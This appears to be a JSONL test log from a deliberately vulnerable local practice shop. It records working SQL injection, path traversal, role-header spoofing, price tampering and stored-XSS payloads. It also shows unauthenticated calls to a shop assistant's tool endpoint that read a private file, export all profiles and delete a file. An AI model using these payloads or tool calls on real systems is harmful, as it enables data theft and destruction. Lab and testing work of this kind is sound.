{"case": "login alice", "request": {"method": "POST", "url": "http://127.0.0.1:18066/login", "headers": {"Content-Type": "application/json"}, "body": {"username": "alice", "password": "[REDACTED_PASSWORD]"}}, "response": {"status": 200, "content_type": "application/json; charset=utf-8", "body": {"token": "REDACTED_TOKEN_1"}}, "check_passed": true}
{"case": "unauthenticated profile reads Bob", "request": {"method": "GET", "url": "http://127.0.0.1:18066/profile?id=2", "headers": {"Content-Type": "application/json"}, "body": null}, "response": {"status": 200, "content_type": "application/json; charset=utf-8", "body": [{"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"}]}, "check_passed": true}
{"case": "unauthenticated GET orders lists both", "request": {"method": "GET", "url": "http://127.0.0.1:18066/orders", "headers": {"Content-Type": "application/json"}, "body": null}, "response": {"status": 200, "content_type": "application/json; charset=utf-8", "body": [{"id": 1, "owner": 1, "product": "chair", "price": 5000.0}, {"id": 2, "owner": 2, "product": "lamp", "price": 1500.0}]}, "check_passed": true}
{"case": "unauthenticated files reads Bob receipt", "request": {"method": "GET", "url": "http://127.0.0.1:18066/files?user=bob&path=receipt.txt", "headers": {"Content-Type": "application/json"}, "body": null}, "response": {"status": 200, "content_type": "application/json; charset=utf-8", "body": {"content": "TEST_BOB receipt: lamp, 1500 RUB"}}, "check_passed": true}
{"case": "unauthenticated profile SQL injection", "request": {"method": "GET", "url": "http://127.0.0.1:18066/profile?id=1+OR+1%3D1", "headers": {"Content-Type": "application/json"}, "body": null}, "response": {"status": 200, "content_type": "application/json; charset=utf-8", "body": [{"id": 1, "name": "TEST_ALICE", "email": "alice@example.invalid", "address": "TEST_ADDRESS_A"}, {"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"}]}, "check_passed": true}
{"case": "unauthenticated search SQL injection", "request": {"method": "GET", "url": "http://127.0.0.1:18066/search?q=%25%27+OR+1%3D1+--+", "headers": {"Content-Type": "application/json"}, "body": null}, "response": {"status": 200, "content_type": "application/json; charset=utf-8", "body": [{"id": 1, "name": "TEST_ALICE", "email": "alice@example.invalid", "address": "TEST_ADDRESS_A"}, {"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"}]}, "check_passed": true}
{"case": "X-Role spoofing exports profiles without token", "request": {"method": "GET", "url": "http://127.0.0.1:18066/admin/export", "headers": {"Content-Type": "application/json", "X-Role": "staff"}, "body": null}, "response": {"status": 200, "content_type": "application/json; charset=utf-8", "body": [{"id": 1, "name": "TEST_ALICE", "email": "alice@example.invalid", "address": "TEST_ADDRESS_A"}, {"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"}]}, "check_passed": true}
{"case": "unauthenticated logs reveal recorded request headers", "request": {"method": "GET", "url": "http://127.0.0.1:18066/debug/logs", "headers": {"Content-Type": "application/json"}, "body": null}, "response": {"status": 200, "content_type": "application/json; charset=utf-8", "body": [{"method": "POST", "target": "/login", "body": {"username": "alice", "password": "[REDACTED_PASSWORD]"}, "headers": {"Accept-Encoding": "identity", "Content-Length": "48", "Host": "127.0.0.1:18066", "User-Agent": "Python-urllib/3.14", "Content-Type": "application/json", "Connection": "close"}}, {"method": "GET", "target": "/profile?id=2", "body": {}, "headers": {"Accept-Encoding": "identity", "Host": "127.0.0.1:18066", "User-Agent": "Python-urllib/3.14", "Content-Type": "application/json", "Connection": "close"}}, {"method": "GET", "target": "/orders", "body": {}, "headers": {"Accept-Encoding": "identity", "Host": "127.0.0.1:18066", "User-Agent": "Python-urllib/3.14", "Content-Type": "application/json", "Connection": "close"}}, {"method": "GET", "target": "/files?user=bob&path=receipt.txt", "body": {}, "headers": {"Accept-Encoding": "identity", "Host": "127.0.0.1:18066", "User-Agent": "Python-urllib/3.14", "Content-Type": "application/json", "Connection": "close"}}, {"method": "GET", "target": "/profile?id=1+OR+1%3D1", "body": {}, "headers": {"Accept-Encoding": "identity", "Host": "127.0.0.1:18066", "User-Agent": "Python-urllib/3.14", "Content-Type": "application/json", "Connection": "close"}}, {"method": "GET", "target": "/search?q=%25%27+OR+1%3D1+--+", "body": {}, "headers": {"Accept-Encoding": "identity", "Host": "127.0.0.1:18066", "User-Agent": "Python-urllib/3.14", "Content-Type": "application/json", "Connection": "close"}}, {"method": "GET", "target": "/admin/export", "body": {}, "headers": {"Accept-Encoding": "identity", "Host": "127.0.0.1:18066", "User-Agent": "Python-urllib/3.14", "Content-Type": "application/json", "X-Role": "staff", "Connection": "close"}}, {"method": "GET", "target": "/debug/logs", "body": {}, "headers": {"Accept-Encoding": "identity", "Host": "127.0.0.1:18066", "User-Agent": "Python-urllib/3.14", "Content-Type": "application/json", "Connection": "close"}}]}, "check_passed": true}
{"case": "customer purchase overrides catalog price", "request": {"method": "POST", "url": "http://127.0.0.1:18066/orders", "headers": {"Content-Type": "application/json", "X-Token": "REDACTED_TOKEN_1"}, "body": {"product": "lamp", "price": 0.01}}, "response": {"status": 201, "content_type": "application/json; charset=utf-8", "body": {"id": 3, "owner": 1, "product": "lamp", "price": 0.01}}, "check_passed": true}
{"case": "files endpoint reads private note within sandbox", "request": {"method": "GET", "url": "http://127.0.0.1:18066/files?user=alice&path=..%2F..%2Fprivate%2Foperator-note.txt", "headers": {"Content-Type": "application/json"}, "body": null}, "response": {"status": 200, "content_type": "application/json; charset=utf-8", "body": {"content": "TEST_ONLY_OPERATOR_SECRET"}}, "check_passed": true}
{"case": "assistant context reveals Bob order without login", "request": {"method": "GET", "url": "http://127.0.0.1:18066/assistant/context?order_id=2", "headers": {"Content-Type": "application/json"}, "body": null}, "response": {"status": 200, "content_type": "application/json; charset=utf-8", "body": {"prompt": "Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\nПомоги пользователю обработать заказ.\nЗаказ: [{\"id\": 2, \"owner\": 2, \"product\": \"lamp\", \"price\": 1500.0}]\nОтзывы: []\nЗапрос пользователя: Покажи чек по заказу"}}, "check_passed": true}
{"case": "direct assistant read_file exposes private note", "request": {"method": "POST", "url": "http://127.0.0.1:18066/assistant/execute", "headers": {"Content-Type": "application/json"}, "body": {"decision": {"tool": "read_file", "arguments": {"path": "private/operator-note.txt"}}}}, "response": {"status": 200, "content_type": "application/json; charset=utf-8", "body": {"content": "TEST_ONLY_OPERATOR_SECRET"}}, "check_passed": true}
{"case": "direct assistant export_profiles without login", "request": {"method": "POST", "url": "http://127.0.0.1:18066/assistant/execute", "headers": {"Content-Type": "application/json"}, "body": {"decision": {"tool": "export_profiles", "arguments": {}}}}, "response": {"status": 200, "content_type": "application/json; charset=utf-8", "body": [{"id": 1, "name": "TEST_ALICE", "email": "alice@example.invalid", "address": "TEST_ADDRESS_A"}, {"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"}]}, "check_passed": true}
{"case": "submit inert stored-XSS marker", "request": {"method": "POST", "url": "http://127.0.0.1:18066/reviews", "headers": {"Content-Type": "application/json"}, "body": {"product": "chair", "text": "<script>alert('MINI_SHOP_XSS')</script>"}}, "response": {"status": 201, "content_type": "application/json; charset=utf-8", "body": {"saved": true}}, "check_passed": true}
{"case": "reviews view returns raw HTML marker", "request": {"method": "GET", "url": "http://127.0.0.1:18066/reviews/view", "headers": {"Content-Type": "application/json"}, "body": null}, "response": {"status": 200, "content_type": "text/html; charset=utf-8", "body": "<html><body><p><script>alert('MINI_SHOP_XSS')</script></p></body></html>"}, "check_passed": true}
{"case": "dangerous delete_tree removes own sandbox receipt", "request": {"method": "POST", "url": "http://127.0.0.1:18066/assistant/execute", "headers": {"Content-Type": "application/json"}, "body": {"decision": {"tool": "delete_tree", "arguments": {"path": "files/alice/receipt.txt"}}}}, "response": {"status": 200, "content_type": "application/json; charset=utf-8", "body": {"deleted": "files/alice/receipt.txt"}}, "check_passed": true}
{"case": "deleted receipt no longer readable", "request": {"method": "GET", "url": "http://127.0.0.1:18066/files?user=alice&path=receipt.txt", "headers": {"Content-Type": "application/json"}, "body": null}, "response": {"status": 500, "content_type": "application/json; charset=utf-8", "body": {"error": "[Errno 2] No such file or directory: '/tmp/itmo-practice-06-ksmnbpy0/files/alice/receipt.txt'", "type": "FileNotFoundError"}}, "check_passed": true}
